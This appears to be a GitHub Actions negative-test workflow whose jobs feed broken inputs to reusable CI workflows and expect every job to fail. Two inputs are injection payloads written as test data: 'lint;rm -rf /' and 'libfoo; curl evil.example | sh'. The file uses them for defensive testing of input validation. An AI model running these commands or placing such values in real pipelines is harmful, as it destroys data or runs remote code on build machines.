name: negative-fixture
run-name: negative ${{ inputs.nonce }}

# Dispatched by self-test.yml. Every job here MUST fail; self-test asserts it.
on:
  workflow_dispatch:
    inputs:
      nonce:
        description: Identifier used by self-test to find this run
        type: string
        required: true

permissions:
  contents: read

jobs:
  broken:
    uses: ./.github/workflows/node-ci.yml
    with:
      working-directory: fixtures/node-broken
  missing-script:
    uses: ./.github/workflows/node-ci.yml
    with:
      working-directory: fixtures/node-missing-script
  nolock:
    uses: ./.github/workflows/node-ci.yml
    with:
      working-directory: fixtures/node-nolock
  node-env-missing:
    # The same fixture self-test runs with `env: FIXTURE_FLAG=1`, without it.
    uses: ./.github/workflows/node-ci.yml
    with:
      working-directory: fixtures/node-env
      scripts: type-check,test
      require: type-check
  node-bad-scripts:
    uses: ./.github/workflows/node-ci.yml
    with:
      working-directory: fixtures/node-npm
      scripts: lint;rm -rf /
  node-bad-env:
    uses: ./.github/workflows/node-ci.yml
    with:
      working-directory: fixtures/node-npm
      env: 1BAD=x
  node-audit-fail:
    uses: ./.github/workflows/node-ci.yml
    with:
      working-directory: fixtures/node-vulnerable
      audit: high
  rust-broken:
    uses: ./.github/workflows/rust-ci.yml
    with:
      working-directory: fixtures/rust-broken
      gate: cargo fmt --check && cargo clippy --locked --all-targets -- -D warnings && cargo test --locked && cargo deny check
  rust-no-toolchain:
    uses: ./.github/workflows/rust-ci.yml
    with:
      working-directory: fixtures/rust-no-toolchain
      gate: cargo fmt --check && cargo clippy --locked --all-targets -- -D warnings && cargo test --locked && cargo deny check
  rust-no-lock:
    uses: ./.github/workflows/rust-ci.yml
    with:
      working-directory: fixtures/rust-no-lock
      gate: cargo fmt --check && cargo clippy --locked --all-targets -- -D warnings && cargo test --locked && cargo deny check
  rust-bad-os:
    uses: ./.github/workflows/rust-ci.yml
    with:
      working-directory: fixtures/rust-ok
      os: '["self-hosted"]'
  rust-bad-apt:
    uses: ./.github/workflows/rust-ci.yml
    with:
      working-directory: fixtures/rust-ok
      apt-packages: libfoo; curl evil.example | sh
  rust-node-no-lock:
    uses: ./.github/workflows/rust-ci.yml
    with:
      working-directory: fixtures/rust-ok
      node-working-directory: fixtures/node-nolock
      gate: cargo --version
  python-broken:
    uses: ./.github/workflows/python-ci.yml
    with:
      working-directory: fixtures/python-broken
  python-no-requirements:
    uses: ./.github/workflows/python-ci.yml
    with:
      working-directory: fixtures/python-no-requirements
  docker-bad-target:
    uses: ./.github/workflows/docker-build.yml
    with:
      context: fixtures/docker-ok
      target: missing
  docker-bad-args:
    uses: ./.github/workflows/docker-build.yml
    with:
      context: fixtures/docker-ok
      build-args: 1BAD=x
  docker-smoke-fail:
    uses: ./.github/workflows/docker-build.yml
    with:
      context: fixtures/docker-ok
      target: production
      smoke: docker run --rm "$IMAGE" | grep -q nope
  android-broken:
    uses: ./.github/workflows/android-ci.yml
    with:
      working-directory: fixtures/android-broken
      # The failing unit test is enough; lint and packaging would add a minute for nothing.
      gate: ./gradlew testDebugUnitTest
  android-no-wrapper:
    uses: ./.github/workflows/android-ci.yml
    with:
      working-directory: fixtures/android-no-wrapper
  infra-bad-severity:
    uses: ./.github/workflows/lint-infra.yml
    with:
      working-directory: fixtures/infra-ok
      shellcheck-severity: all
  infra-bad-shell:
    uses: ./.github/workflows/lint-infra.yml
    with:
      working-directory: fixtures/infra-bad-shell
  infra-bad-dockerfile:
    uses: ./.github/workflows/lint-infra.yml
    with:
      working-directory: fixtures/infra-bad-dockerfile
  infra-bad-compose:
    uses: ./.github/workflows/lint-infra.yml
    with:
      working-directory: fixtures/infra-bad-compose
  infra-bad-workflow:
    uses: ./.github/workflows/lint-infra.yml
    with:
      working-directory: fixtures/infra-bad-workflow
  infra-bad-ansible:
    uses: ./.github/workflows/lint-infra.yml
    with:
      working-directory: fixtures/infra-bad-ansible
